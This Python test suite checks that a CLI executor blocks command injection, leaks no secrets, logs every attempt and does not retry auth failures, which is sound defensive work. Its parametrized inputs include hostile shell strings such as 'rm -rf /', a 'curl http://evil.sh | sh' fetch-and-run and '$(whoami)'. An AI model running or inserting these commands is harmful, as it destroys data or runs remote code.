"""``CliExecutor`` 的七条纪律——本仓唯一一处**把外部命令真的跑起来**的代码。

七条纪律写在 ``executor.py`` 的 docstring 里，但 docstring 不会在被违反时报警。
这个文件的每一条用例对应其中一条，且都按"删掉那条防线会怎样"来写：

* 参数数组执行 ⇒ 元字符必须留在**单个 argv 元素**里（一旦有人为了省事改成
  ``shell=True``，一条含 ``;`` 的文档标题就是一次命令注入）；
* 命令白名单 ⇒ 未登记即拒绝 + 安全告警，且**没有任何命令登记在 DESTRUCTIVE 档**
  （裁决 #10：不可达优于运行时拒绝——运行时拒绝是一个 if，改掉它只要一行）；
* 资源限制 ⇒ 超时、输出上限、工作目录必须真实存在；
* 凭据注入 ⇒ 子进程环境里只能有本命令声明的那几个密钥，别的业务线的一个都不许有；
* 输出处理 / 日志脱敏 ⇒ 审计字段里不得出现密钥明文；
* 审计 ⇒ **每一次尝试**都落一条，不是每个 ``run()`` 一条（否则重试三次在审计里只
  看到一条，排查限流时看不出实际打了几次）；
* 鉴权失败不重试 ⇒ 疑似越权不能靠重试掩盖。

另有 ``tests/platform/test_cli_untrusted_output.py`` 专管"stdout 永远不是错误判据"，
这里不重复那一面。
"""

from __future__ import annotations

import asyncio
import os

import pytest
from pydantic import BaseModel

from app.platform.cli.error_map import SECURITY_CODES
from app.platform.cli.executor import (
    CliCommandSpec,
    CliExecutor,
    RiskLevel,
    _argv_from_model,
)
from app.platform.cli.registry import ALL_COMMANDS
from app.platform.cli.result import CliErrorCode


class _Args(BaseModel):
    doc: str
    max_depth: int | None = None
    with_ids: bool = False
    pattern: list[str] | None = None
    path: str | None = None


# --- 记录型注入点 -----------------------------------------------------------
#
# spawn / audit / alert / sleep 四个都单独记录：把它们合成一个 fake 会让
# "是否重试"和"是否告警"这两件事无法分开断言，而它们恰好是一对——
# 鉴权失败要告警且**不**重试，限流要重试且**不**告警。


class FakeSpawn:
    def __init__(
        self,
        *results: tuple[int, bytes, bytes] | BaseException,
        delay: float = 0.0,
    ) -> None:
        self._results = list(results) or [(0, b'{"ok": true, "data": {}}', b"")]
        self._delay = delay
        self.calls: list[dict[str, object]] = []

    async def __call__(self, argv, *, env, cwd):  # type: ignore[no-untyped-def]
        self.calls.append({"argv": list(argv), "env": dict(env), "cwd": cwd})
        if self._delay:
            await asyncio.sleep(self._delay)
        item = self._results[min(len(self.calls) - 1, len(self._results) - 1)]
        if isinstance(item, BaseException):
            raise item
        return item

    @property
    def argv(self) -> list[str]:
        return list(self.calls[0]["argv"])  # type: ignore[arg-type]

    @property
    def env(self) -> dict[str, str]:
        return dict(self.calls[0]["env"])  # type: ignore[arg-type]


class FakeAudit:
    def __init__(self) -> None:
        self.records: list[dict[str, object]] = []

    async def tool_call(self, **fields: object) -> None:
        self.records.append(fields)


class FakeAlert:
    def __init__(self) -> None:
        self.security_events: list[tuple[str, dict[str, object]]] = []
        self.warns: list[tuple[str, dict[str, object]]] = []

    async def security(self, title: str, **fields: object) -> None:
        self.security_events.append((title, fields))

    async def warn(self, title: str, **fields: object) -> None:
        self.warns.append((title, fields))


class FakeSleep:
    def __init__(self) -> None:
        self.delays: list[float] = []

    async def __call__(self, delay: float) -> None:
        self.delays.append(delay)


def _spec(**kw: object) -> CliCommandSpec:
    base: dict[str, object] = {
        "key": "probe",
        "binary_key": "fake",
        "argv_prefix": ("docs", "+fetch"),
        "args_model": _Args,
        "risk": RiskLevel.READ,
    }
    base.update(kw)
    return CliCommandSpec(**base)  # type: ignore[arg-type]


def _executor(
    spawn: FakeSpawn | None = None,
    *,
    spec: CliCommandSpec | None = None,
    secrets: dict[str, str] | None = None,
    audit: FakeAudit | None = None,
    alert: FakeAlert | None = None,
    sleep: FakeSleep | None = None,
    **kw: object,
) -> CliExecutor:
    return CliExecutor(
        workspace_id="alpha",
        binaries={"fake": "/usr/bin/fake-cli"},
        secrets=secrets or {},
        specs=[spec or _spec()],
        spawn=spawn or FakeSpawn(),
        audit=audit,
        alert=alert,
        retry_sleep=sleep or FakeSleep(),
        **kw,  # type: ignore[arg-type]
    )


# --- 纪律 2：白名单，且删除类不可达 ----------------------------------------


async def test_unregistered_key_is_refused_and_raises_a_security_alert() -> None:
    """未登记的 key ⇒ 拒绝 + 安全告警 + **不起进程**。

    白名单是注入防线的第一层：绕过它就等于把"允许执行哪些命令"的决定权交给了
    调用点。这里同时断言 ``spawn`` 一次都没被调用——只返回错误码但已经起了进程，
    防线就是假的。
    """
    spawn, alert = FakeSpawn(), FakeAlert()
    ex = _executor(spawn, alert=alert)

    res = await ex.run("lark.docs.delete", {"doc": "d1"})

    assert not res.ok
    assert res.error_code is CliErrorCode.INVALID_ARGUMENT
    assert spawn.calls == []
    assert [t for t, _ in alert.security_events] == ["cli.unregistered_command"]


def test_no_command_is_registered_at_destructive_risk() -> None:
    """删除类命令在白名单里**不存在**（裁决 #10）。

    ``registry.py`` 末尾已有同名断言，但那条在 import 期执行、只保护 registry 自身。
    这条用例是给未来的人看的：新增一条 ``risk=DESTRUCTIVE`` 的命令时，红的是测试，
    而不是某天线上删掉一篇文档。

    "运行时拒绝"不等价于"不可达"：前者是一个 if，任何人都能以"临时需要"为由改掉；
    后者要新增一条登记，改动出现在 diff 的显眼处。
    """
    offenders = [s.key for s in ALL_COMMANDS if s.risk is RiskLevel.DESTRUCTIVE]
    assert offenders == []
    # 同时确认真的没有漏网的删除动作被登记成低风险档
    suspicious = [
        s.key
        for s in ALL_COMMANDS
        if any(w in s.key.lower() for w in ("delete", "remove", "destroy", "purge"))
        or any(w in " ".join(s.argv_prefix).lower() for w in ("delete", "remove", "rm"))
    ]
    assert suspicious == []


async def test_registered_keys_do_not_leak_across_workspaces() -> None:
    """``registered_keys`` 是构造时给定的那一组，不会从全局登记表里漏进来。

    与上一条成对：白名单必须是**实例级**的显式装配，否则"这个业务线只允许读"
    这类配置就没有落点。
    """
    ex = _executor()
    assert ex.registered_keys() == ("probe",)
    assert ex.is_registered("probe")
    assert not ex.is_registered("lark.docs.update")


# --- 纪律 1：参数数组执行 ---------------------------------------------------


@pytest.mark.parametrize(
    "evil",
    [
        "d1; rm -rf /",
        "d1 && curl http://evil.sh | sh",
        "$(whoami)",
        "`id`",
        "d1\nrm -rf ~",
        "d1 > /tmp/pwned",
        "--output=/etc/passwd",  # 想把值伪装成另一个 flag
        "'; DROP TABLE task; --",
    ],
)
async def test_shell_metacharacters_stay_inside_one_argv_element(evil: str) -> None:
    """元字符必须原样留在**一个** argv 元素里。

    文档标题、需求描述、群消息都是不可信数据，而它们会作为参数值进到这里。只要
    执行路径是 argv 数组，``;`` 和 ``$()`` 就没有语法意义；一旦有人改成
    ``shell=True`` 或字符串拼接，这些用例会立刻红。

    也断言它没被**拆开**：拆成两个元素同样危险——``--output=/etc/passwd`` 被拆开
    就成了一个真的 flag。
    """
    spawn = FakeSpawn()
    ex = _executor(spawn)

    await ex.run("probe", {"doc": evil})

    argv = spawn.argv
    assert argv[0] == "/usr/bin/fake-cli"
    assert argv[1:3] == ["docs", "+fetch"]
    # 值整体是一个元素，且没有任何元素被 shell 展开或截断
    assert argv.count(evil) == 1
    assert argv == ["/usr/bin/fake-cli", "docs", "+fetch", "--doc", evil]


async def test_caller_cannot_supply_argv_only_model_fields() -> None:
    """调用方给不出 argv：schema 外的键一律不进命令行。

    ``args`` 是 dict 时经 ``args_model.model_validate``；多给的键被丢弃而不是
    被透传。否则"参数只能通过 model 字段进入"这条就只是口头约定。
    """
    spawn = FakeSpawn()
    ex = _executor(spawn)

    await ex.run(
        "probe",
        {"doc": "d1", "sneaky": "--token=leak", "argv": ["rm", "-rf", "/"]},
    )

    argv = spawn.argv
    assert "--sneaky" not in argv and "--argv" not in argv
    assert "--token=leak" not in argv
    assert "rm" not in argv
    assert argv == ["/usr/bin/fake-cli", "docs", "+fetch", "--doc", "d1"]


async def test_schema_violation_never_reaches_the_process() -> None:
    """schema 不过 ⇒ 不起进程。

    "先跑再看错"在写操作上是不可接受的：``docs +update`` 的一次错误调用会改到
    真实文档。
    """
    spawn = FakeSpawn()
    ex = _executor(spawn)

    res = await ex.run("probe", {"max_depth": "不是数字"})  # 缺 doc 且类型错

    assert res.error_code is CliErrorCode.INVALID_ARGUMENT
    assert spawn.calls == []


def test_argv_rendering_rules() -> None:
    """``_argv_from_model`` 的五条渲染规则，逐条钉住。

    规则刻意简单（复杂就意味着有洞），所以每一条都值得一行断言：None 跳过、
    True 出裸 flag、False **不出**、list 重复 flag、positional 走末尾裸值。
    """
    m = _Args(doc="d1", max_depth=3, with_ids=True, pattern=["a", "b"], path="app/x")
    got = _argv_from_model(m, ("path",))
    assert got == [
        "--doc", "d1",
        "--max-depth", "3",
        "--with-ids",
        "--pattern", "a",
        "--pattern", "b",
        "app/x",  # positional 在末尾，且是裸值
    ]

    # False 的 bool 不输出（输出了会变成"开启"的意思）
    assert "--with-ids" not in _argv_from_model(_Args(doc="d", with_ids=False))
    # None 字段跳过
    assert _argv_from_model(_Args(doc="d")) == ["--doc", "d", ]


def test_kv_argv_rendering_rules() -> None:
    """``arg_style="kv"``（tapd-cli）：key=value，True 为 =1，False/None 不出，list 逗号拼接。"""
    m = _Args(doc="d1", max_depth=3, with_ids=True, pattern=["a", "b"], path="x")
    assert _argv_from_model(m, ("path",), "kv") == [
        "doc=d1", "max_depth=3", "with_ids=1", "pattern=a,b", "path=x",
    ]
    assert _argv_from_model(_Args(doc="--help", with_ids=False), (), "kv") == ["doc=--help"]


async def test_positional_value_is_not_interpretable_as_a_flag() -> None:
    """位置参数即使长得像 flag，也只是末尾的一个裸元素。

    ``rg`` 的搜索路径可能源自需求文档。一个写成 ``--files``
    的"路径"若被当成 flag，检索范围就被文档里的一行字改写了。
    """
    spawn = FakeSpawn()
    ex = _executor(spawn, spec=_spec(positional_fields=("path",)))

    await ex.run("probe", {"doc": "d1", "path": "--files"})

    assert spawn.argv[-1] == "--files"
    assert spawn.argv.index("--files") == len(spawn.argv) - 1  # 只在末尾出现


# --- 纪律 4：凭据注入 ------------------------------------------------------


async def test_child_env_contains_only_declared_secrets() -> None:
    """子进程环境里只能有**本命令声明**的密钥。

    继承整个 ``os.environ`` 会把别的业务线的 token 一起带进子进程——而子进程是
    第三方 CLI，它把环境变量打进日志、上报到哪里都不在我们控制内。D-2 的进程级
    隔离在这里落成一行 ``spec.env_keys ∩ secrets``。
    """
    spawn = FakeSpawn()
    ex = _executor(
        spawn,
        spec=_spec(env_keys=("LARK_APP_SECRET",)),
        secrets={
            "LARK_APP_SECRET": "s-mine",
            "TAPD_TOKEN": "s-other-tool",  # 本命令没声明
            "BETA_LARK_APP_SECRET": "s-other-workspace",  # 别的业务线
        },
    )

    await ex.run("probe", {"doc": "d1"})

    env = spawn.env
    assert env["LARK_APP_SECRET"] == "s-mine"
    assert "TAPD_TOKEN" not in env
    assert "BETA_LARK_APP_SECRET" not in env
    # 值级别再查一遍：换个变量名偷偷带出去也算泄漏
    assert "s-other-tool" not in env.values()
    assert "s-other-workspace" not in env.values()


async def test_child_env_is_the_minimal_whitelist_plus_utc() -> None:
    """环境是白名单**而非**黑名单，且时区固定 UTC。

    黑名单在"新增了一个密钥环境变量"时会静默失效；白名单会。TZ 固定是 §9.4-6：
    一条"3 分钟未刷新"的判定如果受宿主时区影响，跨时区部署就会给出不同结论。
    """
    spawn = FakeSpawn()
    ex = _executor(spawn, spec=_spec(env_keys=("LARK_APP_SECRET",)),
                   secrets={"LARK_APP_SECRET": "s"})

    await ex.run("probe", {"doc": "d1"})

    env = spawn.env
    assert env["TZ"] == "UTC"
    allowed = set(CliExecutor._BASE_ENV_KEYS) | {"TZ", "LARK_APP_SECRET"}
    assert set(env) <= allowed, set(env) - allowed
    # 宿主里确实存在、但不在白名单里的变量，不得出现
    assert "PYTHONPATH" not in env or "PYTHONPATH" in allowed


async def test_declared_secret_that_the_workspace_lacks_is_simply_absent() -> None:
    """声明了但本业务线没有的密钥 ⇒ 不注入空串。

    注入 ``KEY=""`` 和不注入是两种语义：很多 CLI 会认为"设置了但是空"是配置错误，
    报出来的却是难以定位的鉴权失败。
    """
    spawn = FakeSpawn()
    ex = _executor(spawn, spec=_spec(env_keys=("MISSING_KEY",)), secrets={})

    await ex.run("probe", {"doc": "d1"})

    assert "MISSING_KEY" not in spawn.env


# --- 纪律 3：资源限制 ------------------------------------------------------


async def test_timeout_yields_retryable_timeout_not_a_hang() -> None:
    """超时靠 ``asyncio.wait_for``（本机无 ``timeout``/``gtimeout``）。

    一个卡住的 CLI 会占住 Workflow 的 step，而 step 上游是用户在群里等一个回复。
    超时必须是**可重试**的技术故障，不是"没查到"。
    """
    spawn = FakeSpawn(delay=0.2)
    ex = _executor(spawn, spec=_spec(timeout_s=0.01), max_attempts=1)

    res = await ex.run("probe", {"doc": "d1"})

    assert res.error_code is CliErrorCode.TIMEOUT
    assert res.retryable


async def test_oversized_output_is_rejected_before_parsing() -> None:
    """超限输出先被拦住，再谈解析。

    先 ``json.loads`` 一个 200MB 的 stdout 等于把上限写成了注释。
    """
    spawn = FakeSpawn((0, b"x" * 5000, b""))
    ex = _executor(spawn, spec=_spec(max_output_bytes=1000), max_attempts=1)

    res = await ex.run("probe", {"doc": "d1"})

    assert res.error_code is CliErrorCode.OUTPUT_TOO_LARGE
    assert "5000" in res.stderr_digest  # 报出实际大小，便于调上限


async def test_nonexistent_cwd_is_refused() -> None:
    """工作目录不存在 ⇒ 拒绝，而不是在意外的目录里执行。

    ``git rev-parse HEAD`` 在错误的目录里会返回**别的仓库**的 sha，而那个 sha 会被
    写进代码搜索的每一条 locator——用户点开跳到一个不存在的位置，且没人会怀疑 sha。
    """
    spawn = FakeSpawn()
    ex = _executor(spawn)

    res = await ex.run("probe", {"doc": "d1"}, cwd="/nope/does/not/exist")

    assert res.error_code is CliErrorCode.BINARY_MISSING
    assert spawn.calls == []


async def test_cwd_argument_overrides_the_constructor_default() -> None:
    """每次调用可以覆盖 cwd——仓库根目录是 workspace 级配置，不是 executor 级常量。

    与上一条成对：只断言"坏 cwd 被拒"的话，一个恒不传 cwd 的实现也能全绿。
    """
    spawn = FakeSpawn()
    ex = _executor(spawn, cwd=os.getcwd())

    await ex.run("probe", {"doc": "d1"}, cwd="/tmp")

    assert spawn.calls[0]["cwd"] == "/tmp"


async def test_missing_binary_is_switch_impl_not_a_security_event() -> None:
    """CLI 没装 ⇒ ``BINARY_MISSING``，**不**走安全告警。

    这条区分很实际：``tapd-cli`` 今日不存在，它该触发的是切 MCP 实现；如果和鉴权
    失败混成一类，每次进程启动都会刷一条假的安全事件，真事件就被淹没了。
    """
    spawn = FakeSpawn(FileNotFoundError("/usr/bin/fake-cli"))
    alert = FakeAlert()
    ex = _executor(spawn, alert=alert, max_attempts=1)

    res = await ex.run("probe", {"doc": "d1"})

    assert res.error_code is CliErrorCode.BINARY_MISSING
    assert not res.retryable  # 重试装不上 CLI
    assert alert.security_events == []


# --- 纪律 7 + 鉴权不重试 ---------------------------------------------------


@pytest.mark.parametrize(
    "stderr,code",
    [
        ("401 unauthorized", CliErrorCode.AUTH_FAILED),
        ("403 permission denied", CliErrorCode.PERMISSION_DENIED),
    ],
)
async def test_auth_failure_alerts_and_never_retries(
    stderr: str, code: CliErrorCode
) -> None:
    """鉴权/权限失败 ⇒ 安全告警 + 零重试。

    整体方案把权限类错误定义为**疑似跨业务线越权**。重试只会把一次越权尝试变成
    三次，还把真正的信号埋在退避日志里。
    """
    spawn = FakeSpawn((1, b"", stderr.encode()))
    alert, sleep = FakeAlert(), FakeSleep()
    ex = _executor(spawn, alert=alert, sleep=sleep, max_attempts=3)

    res = await ex.run("probe", {"doc": "d1"})

    assert res.error_code is code
    assert code in SECURITY_CODES
    assert len(spawn.calls) == 1  # 只打了一次
    assert sleep.delays == []  # 连退避都没进
    assert [t for t, _ in alert.security_events] == ["cli.auth_failure"]


async def test_rate_limit_retries_with_backoff_and_no_security_alert() -> None:
    """限流 ⇒ 退避重试，且**不**是安全事件。

    与上一条成对。只断言"鉴权不重试"的话，一个从不重试的实现也能全绿，而那会让
    每一次上游抖动都变成一次用户可见的失败。
    """
    spawn = FakeSpawn(
        (1, b"", b"429 rate limit exceeded"),
        (1, b"", b"429 rate limit exceeded"),
        (0, b'{"ok": true, "data": {}}', b""),
    )
    alert, sleep = FakeAlert(), FakeSleep()
    ex = _executor(spawn, alert=alert, sleep=sleep, max_attempts=3)

    res = await ex.run("probe", {"doc": "d1"})

    assert res.ok
    assert len(spawn.calls) == 3
    assert len(sleep.delays) == 2  # 第三次成功，不再睡
    assert all(d > 0 for d in sleep.delays)
    assert alert.security_events == []


async def test_backoff_grows_and_carries_jitter() -> None:
    """退避递增且带抖动。

    抖动不是锦上添花：一批需求同时被限流时，固定退避会让它们在同一毫秒整批重试，
    第二轮必然再次全部限流。这里用固定区间断言，不去钉具体随机值。
    """
    spawn = FakeSpawn((1, b"", b"503 service unavailable"))
    sleep = FakeSleep()
    ex = _executor(spawn, sleep=sleep, max_attempts=4)

    await ex.run("probe", {"doc": "d1"})

    assert len(sleep.delays) == 3
    # delay = min(2^(n-1), 8) * (0.5 + rand)，逐项落在各自区间内
    for i, d in enumerate(sleep.delays):
        base = min(2.0**i, 8.0)
        assert base * 0.5 <= d <= base * 1.5, (i, d)
    # 抖动之外仍然递增（区间不重叠地增长）
    assert sleep.delays[0] < sleep.delays[-1]


async def test_unparsable_output_warns_for_a_contract_test_and_does_not_retry() -> None:
    """输出解析不了 ⇒ 告警 + 触发契约测试，而不是重试。

    CLI 升级改了输出格式，重试三次只会得到三份同样解析不了的输出。这类问题要的是
    人去看一眼版本，所以走 ``warn`` 而非 ``security``（它不是越权）。
    """
    spawn = FakeSpawn((0, b"not json at all {{{", b""))
    alert, sleep = FakeAlert(), FakeSleep()
    ex = _executor(spawn, alert=alert, sleep=sleep, max_attempts=3)

    res = await ex.run("probe", {"doc": "d1"})

    assert res.error_code is CliErrorCode.OUTPUT_UNPARSABLE
    assert len(spawn.calls) == 1
    assert sleep.delays == []
    assert [t for t, _ in alert.warns] == ["cli.output_unparsable"]
    assert alert.security_events == []


# --- 纪律 6 + 7：审计与脱敏 ------------------------------------------------


async def test_every_attempt_is_audited_not_just_the_last() -> None:
    """**每一次尝试**落一条审计，不是每个 ``run()`` 一条。

    裁决 #9 把工具调用并入 ``audit_log``。如果只记最后一次，那么"这条需求今天打了
    多少次飞书接口"就查不出来，而限流排查第一个要看的就是这个数。
    """
    spawn = FakeSpawn(
        (1, b"", b"429 rate limit"),
        (1, b"", b"429 rate limit"),
        (0, b'{"ok": true, "data": {}}', b""),
    )
    audit = FakeAudit()
    ex = _executor(spawn, audit=audit, max_attempts=3)

    await ex.run("probe", {"doc": "d1"}, trace_id="t-1", idem_key="idem-1")

    assert len(audit.records) == 3
    assert [r["attempt"] for r in audit.records] == [1, 2, 3]
    assert [r["outcome"] for r in audit.records] == [
        CliErrorCode.RATE_LIMITED.value,
        CliErrorCode.RATE_LIMITED.value,
        "ok",
    ]
    for r in audit.records:
        assert r["workspace_id"] == "alpha"
        assert r["trace_id"] == "t-1"
        assert r["idem_key"] == "idem-1"
        assert r["risk"] == RiskLevel.READ.value
        assert r["action"] == "probe"


@pytest.mark.parametrize("stream", ["stderr", "stdout"])
async def test_audit_carries_digests_never_plaintext_credentials(stream: str) -> None:
    """审计字段里不得出现凭据明文，但也不能被脱敏成一片空白。

    审计是最容易被忽略的泄漏面：它落库、进日志、被导出排查，还常常被当成"内部数据"
    放松管控。所以掩码必须发生在**写入之前**，而不是依赖下游查询时小心。

    两条 stream 都要覆盖：CLI 把错误打在 stdout 信封里是本仓认定的**权威失败信号**，
    那条路径上 stderr 是空的。只验 stderr 的话，最常见的失败路径会在审计里只剩一个
    错误码——写这条用例时确实发现 ``audit_fields()`` 漏了 stdout 兜底。
    """
    leak = "Bearer abcdefghijklmnopqrstuvwxyz0123456789"
    text = f"401 unauthorized: {leak}".encode()
    spawn = FakeSpawn((1, text, b"") if stream == "stdout" else (1, b"", text))
    audit = FakeAudit()
    ex = _executor(
        spawn,
        spec=_spec(env_keys=("LARK_APP_SECRET",), json_output=False),
        secrets={"LARK_APP_SECRET": "super-secret-value"},
        audit=audit,
        max_attempts=1,
    )

    await ex.run("probe", {"doc": "d1"})

    blob = repr(audit.records)
    assert "abcdefghijklmnopqrstuvwxyz0123456789" not in blob
    assert "super-secret-value" not in blob
    # 摘要要留下可排查的痕迹
    assert "401" in blob and "unauthorized" in blob


async def test_args_digest_masks_token_shaped_arguments() -> None:
    """``args_digest`` 里 token 形态的参数值要被掩掉。

    参数本身也可能带凭据（``--token xxx``），而它是我们自己拼的、最容易想当然地
    认为"安全"的那部分。
    """
    spawn = FakeSpawn()
    audit = FakeAudit()
    ex = _executor(spawn, audit=audit)

    await ex.run("probe", {"doc": "tok_9f8e7d6c5b4a39281706f5e4d3c2b1a09f8e7d6c"})

    digest_text = str(audit.records[0]["args_digest"])
    assert "9f8e7d6c5b4a39281706f5e4d3c2b1a09f8e7d6c" not in digest_text
    # 命令形状仍然可见（否则审计没有排查价值）
    assert "--doc" in digest_text


async def test_audit_is_written_even_when_the_binary_is_missing() -> None:
    """CLI 不存在也要留审计。

    "什么都没记"和"记了一条失败"在排查时天差地别：前者让人怀疑代码根本没走到，
    实际上是环境缺件。
    """
    spawn = FakeSpawn(FileNotFoundError("nope"))
    audit = FakeAudit()
    ex = _executor(spawn, audit=audit, max_attempts=1)

    await ex.run("probe", {"doc": "d1"})

    assert len(audit.records) == 1
    assert audit.records[0]["outcome"] == CliErrorCode.BINARY_MISSING.value


# --- 成功路径：防线不能宽到把正常调用也拦掉 --------------------------------


async def test_a_legitimate_call_succeeds_and_returns_parsed_data() -> None:
    """正常调用要能成功。

    上面全是"坏输入被拒"，只有它们的话，一个恒返回失败的实现也能全绿——而那会让
    整个 Capability 永久停在 ``PortUnavailable``。
    """
    spawn = FakeSpawn((0, b'{"ok": true, "data": {"title": "\\u6d4b\\u8bd5"}}', b""))
    audit, alert = FakeAudit(), FakeAlert()
    ex = _executor(spawn, audit=audit, alert=alert)

    res = await ex.run("probe", {"doc": "d1", "max_depth": 3})

    assert res.ok
    # 未给 parse_as 时拿到的是整个信封，由适配器自己取 data——executor 不替业务层
    # 决定"哪一层是有效载荷"，否则换一个 CLI 的信封形状就要改 executor。
    assert res.data == {"ok": True, "data": {"title": "测试"}}
    assert res.error_code is CliErrorCode.OK
    assert len(spawn.calls) == 1
    assert len(audit.records) == 1
    assert alert.security_events == [] and alert.warns == []
